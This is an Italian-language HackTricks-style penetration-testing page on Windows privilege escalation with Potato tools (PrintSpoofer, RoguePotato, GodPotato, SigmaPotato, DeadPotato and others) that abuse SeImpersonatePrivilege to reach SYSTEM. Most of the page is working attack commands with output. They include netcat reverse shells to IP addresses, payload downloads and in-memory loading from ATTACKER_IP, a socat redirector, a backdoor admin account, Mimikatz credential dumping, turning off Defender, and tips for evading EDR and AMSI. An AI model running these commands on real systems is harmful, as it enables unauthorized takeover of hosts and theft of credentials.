# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successive. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere** accesso con livello `NT AUTHORITY\SYSTEM`. Questo [post del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) analizza in dettaglio lo strumento `PrintSpoofer`, che può essere utilizzato per abusare dei privilegi di impersonificazione su host Windows 10 e Server 2019 nei quali JuicyPotato non funziona più.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Un'alternativa moderna, mantenuta frequentemente nel 2024–2025, è SigmaPotato (un fork di GodPotato), che aggiunge l'utilizzo di in-memory/.NET reflection e un supporto esteso per i sistemi operativi. Consulta l'utilizzo rapido qui sotto e il repo nelle References.

Pagine correlate per informazioni di base e tecniche manuali:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisiti e problemi comuni

Tutte le tecniche seguenti si basano sull'abuso di un servizio privilegiato in grado di eseguire l'impersonificazione, da un contesto che possiede uno dei seguenti privilegi:

- SeImpersonatePrivilege (il più comune) o SeAssignPrimaryTokenPrivilege
- Non è richiesta un'integrità elevata se il token dispone già di SeImpersonatePrivilege (caso tipico per molti account di servizio come IIS AppPool, MSSQL, ecc.)

Controlla rapidamente i privilegi:
```cmd
whoami /priv | findstr /i impersonate
```
Note operative:

- Se il tuo shell viene eseguito con un token limitato privo di SeImpersonatePrivilege (comune per Local Service/Network Service in alcuni contesti), recupera i privilegi predefiniti dell’account usando FullPowers, quindi esegui un Potato. Esempio: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer richiede che il servizio Print Spooler sia in esecuzione e raggiungibile tramite l’endpoint RPC locale (spoolss). Negli ambienti hardened in cui Spooler è disabilitato dopo PrintNightmare, preferisci RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato richiede un resolver OXID raggiungibile sulla porta TCP/135. Se l’egress è bloccato, usa un redirector/port-forwarder (vedi l’esempio seguente). Le build più vecchie richiedevano il flag -f.
- EfsPotato/SharpEfsPotato abusano di MS-EFSR; se una pipe è bloccata, prova pipe alternative (lsarpc, efsrpc, samr, lsass, netlogon).
- L’errore 0x6d3 durante RpcBindingSetAuthInfo indica in genere un servizio di autenticazione RPC sconosciuto/non supportato; prova una pipe/un transport diverso oppure assicurati che il servizio target sia in esecuzione.
- I fork “Kitchen-sink”, come DeadPotato, includono moduli payload aggiuntivi (Mimikatz/SharpHound/Defender off) che scrivono sul disco; prevedi un rilevamento EDR maggiore rispetto agli originali slim.

## Demo rapida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Note:
- Puoi usare `-i` per avviare un processo interattivo nella console corrente, oppure `-c` per eseguire un one-liner.
- Richiede il servizio Spooler. Se disabilitato, l'operazione fallirà.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se la porta 135 in uscita è bloccata, esegui il pivot del resolver OXID tramite socat sul tuo redirector:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato è un primitive più recente per l'abuso di COM, rilasciato alla fine del 2022, che prende di mira il servizio **PrintNotify** invece di Spooler/BITS. Il binary istanzia il server COM PrintNotify, sostituisce un `IUnknown` fake, quindi attiva una callback privilegiata tramite `CreatePointerMoniker`. Quando il servizio PrintNotify (in esecuzione come **SYSTEM**) si riconnette, il processo duplica il token restituito e avvia il payload fornito con privilegi completi.<sup>[[13]](#references)</sup>

Note operative principali:

* Funziona su Windows 10/11 e Windows Server 2012–2022, purché il servizio Print Workflow/PrintNotify sia installato (è presente anche quando il servizio Spooler legacy è disabilitato dopo PrintNightmare).
* Richiede che il contesto chiamante disponga del privilegio `SeImpersonatePrivilege` (comune per IIS APPPOOL, MSSQL e gli account di servizio delle attività pianificate).
* Accetta sia un comando diretto sia una modalità interattiva, permettendo di rimanere nella console originale. Esempio:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Poiché è basato esclusivamente su COM, non richiede listener named pipe o redirector esterni, rendendolo un sostituto drop-in sugli host in cui Defender blocca il binding RPC di RoguePotato.

Operatori come Ink Dragon eseguono PrintNotifyPotato immediatamente dopo aver ottenuto una RCE tramite ViewState su SharePoint per effettuare il pivot dal worker `w3wp.exe` a SYSTEM prima di installare ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Suggerimento: se una pipe fallisce o l'EDR la blocca, prova le altre pipe supportate:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Note:
- Funziona su Windows 8/8.1–11 e Server 2012–2022 quando è presente SeImpersonatePrivilege.
- Recupera il binary corrispondente al runtime installato (ad esempio, `GodPotato-NET4.exe` su Server 2022 moderni).
- Se il tuo primitive iniziale di esecuzione è una webshell/UI con timeout brevi, prepara il payload come script e chiedi a GodPotato di eseguirlo invece di usare un comando inline lungo.<sup>[[12]](#references)</sup>

Pattern rapido di staging da una webroot IIS scrivibile:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornisce due varianti rivolte agli oggetti DCOM dei servizi che utilizzano per impostazione predefinita RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa i binari forniti ed esegui il tuo comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork aggiornato di GodPotato)

SigmaPotato aggiunge funzionalità moderne come l'esecuzione in-memory tramite reflection .NET e un helper per la reverse shell PowerShell.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Ulteriori vantaggi nelle build 2024–2025 (v1.2.x):
- Flag reverse shell integrato `--revshell` e rimozione del limite di 1024 caratteri di PowerShell, così puoi eseguire payload lunghi che bypassano AMSI in un'unica operazione.
- Sintassi compatibile con la reflection (`[SigmaPotato]::Main()`), oltre a un rudimentale trucco di AV evasion tramite `VirtualAllocExNuma()` per confondere le euristiche più semplici.
- `SigmaPotatoCore.exe` separato, compilato per .NET 2.0 per gli ambienti PowerShell Core.

### DeadPotato (rework di GodPotato del 2024 con moduli)

DeadPotato mantiene la catena di impersonation OXID/DCOM di GodPotato, ma integra helper di post-exploitation, consentendo agli operatori di ottenere immediatamente SYSTEM ed eseguire persistence/collection senza strumenti aggiuntivi.<sup>[[15]](#references)</sup>

Moduli comuni (tutti richiedono SeImpersonatePrivilege):

- `-cmd "<cmd>"` — avvia un comando arbitrario come SYSTEM.
- `-rev <ip:port>` — reverse shell rapida.
- `-newadmin user:pass` — crea un amministratore locale per la persistence.
- `-mimi sam|lsa|all` — scarica ed esegue Mimikatz per estrarre le credenziali (scrive su disco, rumoroso).
- `-sharphound` — esegue la collection di SharpHound come SYSTEM.
- `-defender off` — disabilita la protezione in tempo reale di Defender (molto rumoroso).

Esempi di one-liner:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Poiché include binary aggiuntivi, aspettati un numero maggiore di rilevamenti da parte di AV/EDR; usa il più compatto GodPotato/SigmaPotato quando la stealth è importante.

## Riferimenti

- [1] [PrintSpoofer – Sfruttare i privilegi di impersonificazione su Windows 10 e Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Niente più JuicyPotato? Vecchia storia, benvenuto RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Ripristinare i privilegi predefiniti dei token per gli account dei servizi](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — leak NTLM di WMP → junction NTFS alla webroot RCE → FullPowers + GodPotato a SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — macro di LibreOffice → webshell IIS → GodPotato a SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Dentro Ink Dragon: rivelazione della relay network e del funzionamento interno di un'operazione offensiva stealth](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Rielaborazione di GodPotato con moduli post-ex integrati](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
